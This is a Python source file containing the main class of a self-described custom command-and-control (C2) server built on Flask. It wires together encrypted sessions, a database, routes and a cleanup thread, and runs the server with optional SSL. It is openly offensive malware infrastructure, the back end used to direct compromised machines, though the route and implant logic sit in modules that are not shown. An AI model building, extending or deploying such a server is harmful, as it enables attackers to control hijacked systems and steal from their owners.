import secrets
import os
import sys
from flask import Flask
from .config import load_config, derive_encryption_key
from .logging import setup_logging
from .database import init_database
from .encryption import EncryptionHandler
from .routes import register_routes
from .cleanup import start_cleanup_thread

class C2Server:
    def __init__(self, config_file='config/c2_config.json'):
        self.config = load_config(config_file)
        self.db_path = 'c2_data/c2.db'
        self.logger = setup_logging()
        self.logger.info(f"Created default config: {config_file}")
        self.encryption_key = derive_encryption_key(self.config['c2']['encryption_password'])
        self.encryption_handler = EncryptionHandler(self.encryption_key)
        init_database(self.db_path)
        self.app = Flask(__name__)
        self.app.config['SECRET_KEY'] = secrets.token_hex(32)
        register_routes(self.app, self.config, self.db_path, self.encryption_handler, self.logger)
        start_cleanup_thread(self.db_path, self.config['c2']['max_session_age_days'], self.logger)

    def run(self):
        print("="*60)
        print("CUSTOM C2 SERVER")
        print("="*60)
        print(f"[*] Server: {self.config['server']['host']}:{self.config['server']['port']}")
        print(f"[*] SSL: {'Enabled' if self.config['server']['use_ssl'] else 'Disabled'}")
        print(f"[*] Auth Token: {self.config['authentication']['auth_token']}")
        print(f"[*] Encryption: AES-256 via Fernet")
        print(f"[*] Database: {self.db_path}")
        print("="*60)
        print("[*] Server starting...")
        print()

        if self.config['server']['use_ssl']:
            ssl_cert = self.config['server']['ssl_cert']
            ssl_key = self.config['server']['ssl_key']
            if not os.path.exists(ssl_cert) or not os.path.exists(ssl_key):
                print("[!] SSL certificates not found")
                print("[!] Generate with:")
                print(f"    openssl req -x509 -newkey rsa:4096 -nodes \\")
                print(f"      -keyout {ssl_key} -out {ssl_cert} -days 365")
                sys.exit(1)
            context = (ssl_cert, ssl_key)
        else:
            context = None

        self.app.run(
            host=self.config['server']['host'],
            port=self.config['server']['port'],
            ssl_context=context,
            debug=False
        )